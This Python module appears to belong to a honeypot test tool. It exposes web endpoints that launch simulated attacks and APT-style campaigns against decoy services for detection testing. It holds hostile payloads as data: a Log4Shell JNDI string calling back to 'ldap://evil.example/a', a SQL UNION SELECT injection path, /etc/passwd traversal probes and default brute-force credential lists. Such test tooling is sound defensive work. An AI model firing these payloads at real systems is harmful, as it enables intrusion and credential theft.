"""`/api/play/*` — drive attacks from the browser.

Thin REST layer over the existing async runners in
`honeystrike.cli.attack.runners`. The actual attack engines are unchanged
— this just exposes them to the dashboard UI:

  - `POST /api/play/attack`         launch a scenario, returns task_id
  - `GET  /api/play/attack/{id}`    poll for status/progress
  - `GET  /api/play/scenarios`      catalogue + display metadata
  - `POST /api/play/campaign`       launch a multi-step campaign

Tasks live in an in-memory registry keyed by uuid; the dashboard polls
every ~1 s while the task runs. Restarting the API drops in-flight tasks
(that's fine for a demo / playground tool).
"""

from __future__ import annotations

import asyncio
import time
import uuid
from dataclasses import dataclass, field
from typing import Annotated, Any

from fastapi import APIRouter, Depends, HTTPException, status
from pydantic import BaseModel, Field

from honeystrike.api.auth import current_user
from honeystrike.cli.attack import campaigns as campaign_module
from honeystrike.cli.attack import runners
from honeystrike.core.models import User

router = APIRouter(prefix="/api/play", tags=["play"])


# ---------------------------------------------------------------------------
# Task registry
# ---------------------------------------------------------------------------

@dataclass
class PlayTask:
    task_id: str
    scenario: str
    target: str
    status: str = "running"             # running | done | failed
    started_at: float = field(default_factory=time.time)
    finished_at: float | None = None
    phase: str = "starting"
    summary: dict[str, Any] | None = None
    error: str | None = None


_TASKS: dict[str, PlayTask] = {}
_TASK_TTL_SECONDS = 600


def _gc_old_tasks() -> None:
    now = time.time()
    stale = [tid for tid, t in _TASKS.items()
             if t.finished_at and now - t.finished_at > _TASK_TTL_SECONDS]
    for tid in stale:
        _TASKS.pop(tid, None)


# ---------------------------------------------------------------------------
# Scenario catalogue — what the picker page shows
# ---------------------------------------------------------------------------

_SCENARIOS = [
    {"id": "ssh-hydra",      "label": "SSH brute force (Hydra)",
     "service": "ssh",  "default_target": "ssh-honeypot:22",
     "blurb": "Paramiko-driven password brute force using the Hydra default wordlist.",
     "expected_ttps": ["T1110.001"]},
    {"id": "http-sqlmap",    "label": "sqlmap SQL injection",
     "service": "http", "default_target": "http-honeypot:80",
     "blurb": "sqlmap User-Agent + UNION-SELECT payload to /wp-admin.",
     "expected_ttps": ["T1190"]},
    {"id": "http-log4shell", "label": "Log4Shell (CVE-2021-44228)",
     "service": "http", "default_target": "http-honeypot:80",
     "blurb": "JNDI:LDAP payload posted to an API endpoint.",
     "expected_ttps": ["T1190"]},
    {"id": "http-traversal", "label": "Path traversal",
     "service": "http", "default_target": "http-honeypot:80",
     "blurb": "`../../../etc/passwd`-style probes with optional URL encoding.",
     "expected_ttps": ["T1083"]},
    {"id": "http-recon",     "label": "HTTP recon (canary capture)",
     "service": "http", "default_target": "http-honeypot:80",
     "blurb": "/.env, /.git/HEAD, /wp-admin, /phpmyadmin — also triggers CTF canaries.",
     "expected_ttps": ["T1592", "T1595.001"]},
    {"id": "ftp-hydra",      "label": "FTP brute force",
     "service": "ftp",  "default_target": "ftp-honeypot:21",
     "blurb": "ftplib login attempts with breach-dump credentials.",
     "expected_ttps": ["T1110.001"]},
    {"id": "rdp-scan",       "label": "RDP connection request",
     "service": "rdp",  "default_target": "rdp-honeypot:3389",
     "blurb": "TPKT + X.224 with mstshash cookie.",
     "expected_ttps": ["T1595.001"]},
    {"id": "tls-fingerprint","label": "TLS / JA3 capture",
     "service": "tls",  "default_target": "tls-honeypot:443",
     "blurb": "Plain TLS handshake — sniffer computes the JA3 fingerprint.",
     "expected_ttps": []},
    {"id": "multi-service",  "label": "Multi-service scan",
     "service": "ssh",  "default_target": "ssh-honeypot",  # host only
     "blurb": "Same IP hits 3+ services in 30s — guarantees T1595.001.",
     "expected_ttps": ["T1595.001"]},
    {"id": "full-compromise","label": "Full compromise chain",
     "service": "ssh",  "default_target": "ssh-honeypot",
     "blurb": "Recon → SQLi → SSH brute + shell → FTP → TLS. ~6–10 sessions.",
     "expected_ttps": ["T1190", "T1110.001", "T1078", "T1083", "T1592"]},
]


_CAMPAIGNS = [
    {"id": "apt28",
     "label": "APT28 simulation",
     "blurb": "HTTP recon → sqlmap → SSH brute + shell discovery + exfil.",
     "expected_ttps": ["T1595.001", "T1592", "T1190", "T1110.001", "T1078", "T1083"]},
    {"id": "fin7",
     "label": "FIN7 simulation",
     "blurb": "sqlmap recon → path traversal → FTP credential reuse.",
     "expected_ttps": ["T1190", "T1083", "T1110.001"]},
    {"id": "ransomware-deployer",
     "label": "Ransomware deployer",
     "blurb": "RDP scan → SSH brute → mass HTTP recon → multi-service.",
     "expected_ttps": ["T1595.001", "T1110.001", "T1592"]},
    {"id": "script-kiddie",
     "label": "Script kiddie (baseline)",
     "blurb": "Two low-noise probes — useful as a 'no alert expected' control.",
     "expected_ttps": []},
]


# ---------------------------------------------------------------------------
# Pydantic IO
# ---------------------------------------------------------------------------

class AttackIn(BaseModel):
    scenario: str
    target: str | None = None
    intensity: str = "burst"           # slow | medium | burst
    count: int | None = None
    keep_shell: bool = False
    username: str = "root"
    user_agent: str | None = None


class TaskOut(BaseModel):
    task_id: str
    scenario: str
    target: str
    status: str
    started_at: float
    finished_at: float | None = None
    phase: str
    summary: dict[str, Any] | None = None
    error: str | None = None


class CampaignIn(BaseModel):
    name: str = Field(..., description="apt28 | fin7 | ransomware-deployer | script-kiddie")
    target_host: str = "ssh-honeypot"


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@router.get("/scenarios")
async def list_scenarios(
    _user: Annotated[User, Depends(current_user)],
) -> dict[str, Any]:
    """All scenarios + campaigns shown in the picker UI."""
    return {"scenarios": _SCENARIOS, "campaigns": _CAMPAIGNS}


@router.post("/attack", response_model=TaskOut, status_code=202)
async def launch_attack(
    body: AttackIn,
    _user: Annotated[User, Depends(current_user)],
) -> TaskOut:
    _gc_old_tasks()
    scenario_meta = next((s for s in _SCENARIOS if s["id"] == body.scenario), None)
    if scenario_meta is None:
        raise HTTPException(status_code=400, detail=f"unknown scenario {body.scenario!r}")
    target = body.target or scenario_meta["default_target"]
    task = PlayTask(task_id=str(uuid.uuid4()), scenario=body.scenario, target=target)
    _TASKS[task.task_id] = task

    coro = _dispatch_scenario(body, target, scenario_meta)
    asyncio.create_task(_run_task(task, coro))
    return _to_out(task)


@router.post("/campaign", response_model=TaskOut, status_code=202)
async def launch_campaign(
    body: CampaignIn,
    _user: Annotated[User, Depends(current_user)],
) -> TaskOut:
    _gc_old_tasks()
    if body.name not in campaign_module._PLAYBOOKS:           # noqa: SLF001
        raise HTTPException(status_code=400, detail=f"unknown campaign {body.name!r}")
    playbook = campaign_module._PLAYBOOKS[body.name](body.target_host)  # noqa: SLF001
    task = PlayTask(task_id=str(uuid.uuid4()),
                    scenario=f"campaign:{body.name}",
                    target=body.target_host)
    _TASKS[task.task_id] = task

    async def _run_chain() -> dict[str, Any]:
        steps_run = 0
        for step in playbook.steps:
            task.phase = step.name
            await step.runner(**step.kwargs)
            steps_run += 1
            await asyncio.sleep(min(step.dwell_seconds, 1.0))   # cap UI dwell
        return {"steps": steps_run, "expected_ttps": list(playbook.expected_ttps)}

    asyncio.create_task(_run_task(task, _run_chain()))
    return _to_out(task)


@router.get("/attack/{task_id}", response_model=TaskOut)
async def get_task(
    task_id: str,
    _user: Annotated[User, Depends(current_user)],
) -> TaskOut:
    task = _TASKS.get(task_id)
    if task is None:
        raise HTTPException(status_code=404, detail="unknown or expired task")
    return _to_out(task)


@router.get("/tasks", response_model=list[TaskOut])
async def list_tasks(
    _user: Annotated[User, Depends(current_user)],
) -> list[TaskOut]:
    _gc_old_tasks()
    return sorted(
        (_to_out(t) for t in _TASKS.values()),
        key=lambda t: t.started_at, reverse=True,
    )[:50]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

async def _dispatch_scenario(body: AttackIn, target: str, meta: dict) -> Any:
    s = body.scenario
    intensity = body.intensity
    if s == "ssh-hydra":
        return await runners.ssh_hydra(
            target=target, username=body.username,
            count=body.count, intensity=intensity, keep_shell=body.keep_shell,
        )
    if s == "http-sqlmap":
        return await runners.http_sqlmap(
            target=target,
            path="/wp-admin/index.php?id=1+UNION+SELECT+password+FROM+users",
            user_agent=body.user_agent or "sqlmap/1.7.8#stable",
            count=body.count or 1, intensity=intensity,
        )
    if s == "http-log4shell":
        return await runners.http_log4shell(
            target=target, path="/api/v1/health",
            callback="ldap://evil.example/a", count=body.count or 1,
        )
    if s == "http-traversal":
        return await runners.http_traversal(
            target=target, depth=5, encoding="plain",
        )
    if s == "http-recon":
        return await runners.http_recon(
            target=target, paths=None,
            user_agent=body.user_agent or "Nikto/2.5.0",
        )
    if s == "ftp-hydra":
        return await runners.ftp_hydra(
            target=target, credentials="root:toor,admin:admin,oracle:oracle",
            intensity=intensity,
        )
    if s == "rdp-scan":
        return await runners.rdp_scan(
            target=target, cookie="mstshash=PlayPanel", protocols=0,
        )
    if s == "tls-fingerprint":
        return await runners.tls_fingerprint(
            target=target, sni="example.com", cipher_mode="default",
        )
    if s == "multi-service":
        host = target.split(":")[0]
        return await runners.multi_service(
            target_host=host, services=["ssh", "http", "ftp", "tls"],
            intensity=intensity,
        )
    if s == "full-compromise":
        host = target.split(":")[0]
        return await runners.full_compromise(
            target_host=host, dwell_seconds=1.0, with_report=False,
        )
    raise HTTPException(status_code=400, detail=f"unmapped scenario {s!r}")


async def _run_task(task: PlayTask, coro) -> None:                # noqa: ANN001
    try:
        result = await coro
        task.summary = result if isinstance(result, dict) else {"result": result}
        task.status = "done"
        task.phase = "complete"
    except Exception as exc:                                       # noqa: BLE001
        task.status = "failed"
        task.phase = "error"
        task.error = str(exc)
    finally:
        task.finished_at = time.time()


def _to_out(t: PlayTask) -> TaskOut:
    return TaskOut(
        task_id=t.task_id, scenario=t.scenario, target=t.target,
        status=t.status, started_at=t.started_at,
        finished_at=t.finished_at, phase=t.phase,
        summary=t.summary, error=t.error,
    )
